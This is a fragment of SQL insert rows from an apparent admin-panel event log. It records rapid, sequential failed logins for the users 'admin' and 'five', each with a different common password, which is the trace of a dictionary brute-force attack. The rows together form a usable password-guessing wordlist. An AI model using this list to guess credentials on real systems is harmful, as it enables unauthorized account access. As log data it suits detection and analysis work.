(101, 'WARNING_AUTH_NOT_SUCCESS', 'admin, cl4.r0ut3r, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516607),
(102, 'WARNING_AUTH_NOT_SUCCESS', 'admin, crs, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516608),
(103, 'WARNING_AUTH_NOT_SUCCESS', 'admin, daniel, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516608),
(104, 'WARNING_AUTH_NOT_SUCCESS', 'admin, demo, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516610),
(105, 'WARNING_AUTH_NOT_SUCCESS', 'admin, gati07, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516612),
(106, 'WARNING_AUTH_NOT_SUCCESS', 'admin, guest, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516613),
(107, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iamawesome, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516614),
(108, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iloveu1362, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516614),
(109, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iloveyou, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516615),
(110, 'WARNING_AUTH_NOT_SUCCESS', 'admin, internet, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516616),
(111, 'WARNING_AUTH_NOT_SUCCESS', 'admin, iz85917031, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516617),
(112, 'WARNING_AUTH_NOT_SUCCESS', 'admin, jackmark456, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516618),
(113, 'WARNING_AUTH_NOT_SUCCESS', 'admin, jimmy098, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516619),
(114, 'WARNING_AUTH_NOT_SUCCESS', 'admin, jimmy123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516620),
(115, 'WARNING_AUTH_NOT_SUCCESS', 'admin, justaddwater, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516621),
(116, 'WARNING_AUTH_NOT_SUCCESS', 'admin, kbctyjr, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516621),
(117, 'WARNING_AUTH_NOT_SUCCESS', 'admin, master, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516622),
(118, 'WARNING_AUTH_NOT_SUCCESS', 'admin, michelle, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516623),
(119, 'WARNING_AUTH_NOT_SUCCESS', 'admin, mpmstas,,11, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516624),
(120, 'WARNING_AUTH_NOT_SUCCESS', 'admin, mustang, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516625),
(121, 'WARNING_AUTH_NOT_SUCCESS', 'admin, oktober83, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516626),
(122, 'WARNING_AUTH_NOT_SUCCESS', 'admin, omgponies, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516627),
(123, 'WARNING_AUTH_NOT_SUCCESS', 'admin, parola, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516627),
(124, 'WARNING_AUTH_NOT_SUCCESS', 'admin, pass, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516628),
(125, 'WARNING_AUTH_NOT_SUCCESS', 'admin, password, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516629),
(126, 'WARNING_AUTH_NOT_SUCCESS', 'admin, password1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516630),
(127, 'WARNING_AUTH_NOT_SUCCESS', 'admin, princess, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516631),
(128, 'WARNING_AUTH_NOT_SUCCESS', 'admin, q1w2e3r4, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516632),
(129, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qazwsx, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516633),
(130, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qwerty, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516633),
(131, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qwerty123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516634),
(132, 'WARNING_AUTH_NOT_SUCCESS', 'admin, qwertyuiop, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516635),
(133, 'WARNING_AUTH_NOT_SUCCESS', 'admin, realbetis07, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516636),
(134, 'WARNING_AUTH_NOT_SUCCESS', 'admin, root, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516637),
(135, 'WARNING_AUTH_NOT_SUCCESS', 'admin, samsung, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516638),
(136, 'WARNING_AUTH_NOT_SUCCESS', 'admin, sergio80, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516639),
(137, 'WARNING_AUTH_NOT_SUCCESS', 'admin, shadow, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516640),
(138, 'WARNING_AUTH_NOT_SUCCESS', 'admin, spoofyou2015, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516640),
(139, 'WARNING_AUTH_NOT_SUCCESS', 'admin, student, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516641),
(140, 'WARNING_AUTH_NOT_SUCCESS', 'admin, sunshine, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516642),
(141, 'WARNING_AUTH_NOT_SUCCESS', 'admin, test, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516643),
(142, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ubnt, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516644),
(143, 'WARNING_AUTH_NOT_SUCCESS', 'admin, user, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516645),
(144, 'WARNING_AUTH_NOT_SUCCESS', 'admin, welcome, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516646),
(145, 'WARNING_AUTH_NOT_SUCCESS', 'admin, welcome1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516648),
(146, 'WARNING_AUTH_NOT_SUCCESS', 'admin, zonnetje, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516649),
(147, 'WARNING_AUTH_NOT_SUCCESS', 'admin, zxcvbnm, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516650),
(148, 'WARNING_AUTH_NOT_SUCCESS', 'five, ******, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516651),
(149, 'WARNING_AUTH_NOT_SUCCESS', 'five, *******, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516652),
(150, 'WARNING_AUTH_NOT_SUCCESS', 'five, ********, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516652),
(151, 'WARNING_AUTH_NOT_SUCCESS', 'five, *********, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516653),
(152, 'WARNING_AUTH_NOT_SUCCESS', 'five, **********, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516654),
(153, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516655),
(154, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0000, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516656),
(155, 'WARNING_AUTH_NOT_SUCCESS', 'five, 000000, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516657),
(156, 'WARNING_AUTH_NOT_SUCCESS', 'five, 00000000, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516658),
(157, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0123456789, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516658),
(158, 'WARNING_AUTH_NOT_SUCCESS', 'five, 0987654321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516659),
(159, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516660),
(160, 'WARNING_AUTH_NOT_SUCCESS', 'five, 102030, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516661),
(161, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516662),
(162, 'WARNING_AUTH_NOT_SUCCESS', 'five, 11111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516663),
(163, 'WARNING_AUTH_NOT_SUCCESS', 'five, 111111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516664),
(164, 'WARNING_AUTH_NOT_SUCCESS', 'five, 11111111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516665),
(165, 'WARNING_AUTH_NOT_SUCCESS', 'five, 112233, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516665),
(166, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1128, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516666),
(167, 'WARNING_AUTH_NOT_SUCCESS', 'five, 121212, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516667),
(168, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516668),
(169, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516669),
(170, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123123123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516670),
(171, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516671),
(172, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516671),
(173, 'WARNING_AUTH_NOT_SUCCESS', 'five, 12341234, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516672),
(174, 'WARNING_AUTH_NOT_SUCCESS', 'five, 12345, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516673),
(175, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123456, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516674),
(176, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234567, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516675),
(177, 'WARNING_AUTH_NOT_SUCCESS', 'five, 12345678, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516676),
(178, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123456789, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516677),
(179, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234567890, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516677),
(180, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1234qwer, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516679),
(181, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123654, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516680),
(182, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123abc, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516681),
(183, 'WARNING_AUTH_NOT_SUCCESS', 'five, 123qwe, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516682),
(184, 'WARNING_AUTH_NOT_SUCCESS', 'five, 159357, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516683),
(185, 'WARNING_AUTH_NOT_SUCCESS', 'five, 159753, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516684),
(186, 'WARNING_AUTH_NOT_SUCCESS', 'five, 19731973, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516684),
(187, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1q2w3e, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516685),
(188, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1q2w3e4r, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516686),
(189, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1q2w3e4r5t, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516687),
(190, 'WARNING_AUTH_NOT_SUCCESS', 'five, 1qaz2wsx, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516688),
(191, 'WARNING_AUTH_NOT_SUCCESS', 'five, 222222, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516689),
(192, 'WARNING_AUTH_NOT_SUCCESS', 'five, 42Olympia, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516690),
(193, 'WARNING_AUTH_NOT_SUCCESS', 'five, 4uA7d0A1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516691),
(194, 'WARNING_AUTH_NOT_SUCCESS', 'five, 4uA7d0B2, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516692),
(195, 'WARNING_AUTH_NOT_SUCCESS', 'five, 555555, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516692),
(196, 'WARNING_AUTH_NOT_SUCCESS', 'five, 654321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516693),
(197, 'WARNING_AUTH_NOT_SUCCESS', 'five, 666666, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516694),
(198, 'WARNING_AUTH_NOT_SUCCESS', 'five, 777777, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516695),
(199, 'WARNING_AUTH_NOT_SUCCESS', 'five, 7777777, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516696),
(200, 'WARNING_AUTH_NOT_SUCCESS', 'five, 888888, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516697),
(201, 'WARNING_AUTH_NOT_SUCCESS', 'five, 88888888, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516698),
(202, 'WARNING_AUTH_NOT_SUCCESS', 'five, 8WI5Hlbww*Q%, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516699),
(203, 'WARNING_AUTH_NOT_SUCCESS', 'five, 97cCm#, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516699),
(204, 'WARNING_AUTH_NOT_SUCCESS', 'five, 987654, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516700),
(205, 'WARNING_AUTH_NOT_SUCCESS', 'five, 987654321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516701),
(206, 'WARNING_AUTH_NOT_SUCCESS', 'five, 999999, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516702),
(207, 'WARNING_AUTH_NOT_SUCCESS', 'five, ??????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516703),
(208, 'WARNING_AUTH_NOT_SUCCESS', 'five, ???????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516704),
(209, 'WARNING_AUTH_NOT_SUCCESS', 'five, ????????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516705),
(210, 'WARNING_AUTH_NOT_SUCCESS', 'five, ?????????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516705),
(211, 'WARNING_AUTH_NOT_SUCCESS', 'five, BALANDAS, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516706),
(212, 'WARNING_AUTH_NOT_SUCCESS', 'five, Cannot Decrypt, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516707),
(213, 'WARNING_AUTH_NOT_SUCCESS', 'five, Caroline123@, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516708),
(214, 'WARNING_AUTH_NOT_SUCCESS', 'five, Dr%*iKm, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516709),
(215, 'WARNING_AUTH_NOT_SUCCESS', 'five, Every1Out, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516710),
(216, 'WARNING_AUTH_NOT_SUCCESS', 'five, FTpdo24#, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516711),
(217, 'WARNING_AUTH_NOT_SUCCESS', 'five, Ghj124$(), RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516712),
(218, 'WARNING_AUTH_NOT_SUCCESS', 'five, HowMuchIsTheFish, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516713),
(219, 'WARNING_AUTH_NOT_SUCCESS', 'five, Hwa303859, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516714),
(220, 'WARNING_AUTH_NOT_SUCCESS', 'five, Karend22, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516715),
(221, 'WARNING_AUTH_NOT_SUCCESS', 'five, LogMeIn, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516716),
(222, 'WARNING_AUTH_NOT_SUCCESS', 'five, No Data!, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516716),
(223, 'WARNING_AUTH_NOT_SUCCESS', 'five, Note:, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516717),
(224, 'WARNING_AUTH_NOT_SUCCESS', 'five, P@ssw0rd, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516718),
(225, 'WARNING_AUTH_NOT_SUCCESS', 'five, Password, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516719),
(226, 'WARNING_AUTH_NOT_SUCCESS', 'five, Password1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516720),
(227, 'WARNING_AUTH_NOT_SUCCESS', 'five, Password123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516721),
(228, 'WARNING_AUTH_NOT_SUCCESS', 'five, Passwort, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516722),
(229, 'WARNING_AUTH_NOT_SUCCESS', 'five, Sakhie64, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516723),
(230, 'WARNING_AUTH_NOT_SUCCESS', 'five, Shamrock77, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516724),
(231, 'WARNING_AUTH_NOT_SUCCESS', 'five, Test, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516724),
(232, 'WARNING_AUTH_NOT_SUCCESS', 'five, Welcome1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516725),
(233, 'WARNING_AUTH_NOT_SUCCESS', 'five, [EMPTY PASSWORD], RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516726),
(234, 'WARNING_AUTH_NOT_SUCCESS', 'five, aaaaaa, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516727),
(235, 'WARNING_AUTH_NOT_SUCCESS', 'five, abc123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516728),
(236, 'WARNING_AUTH_NOT_SUCCESS', 'five, abcd1234, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516729),
(237, 'WARNING_AUTH_NOT_SUCCESS', 'five, admin, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516730),
(238, 'WARNING_AUTH_NOT_SUCCESS', 'five, admin123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516730),
(239, 'WARNING_AUTH_NOT_SUCCESS', 'five, alpha1906, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516731),
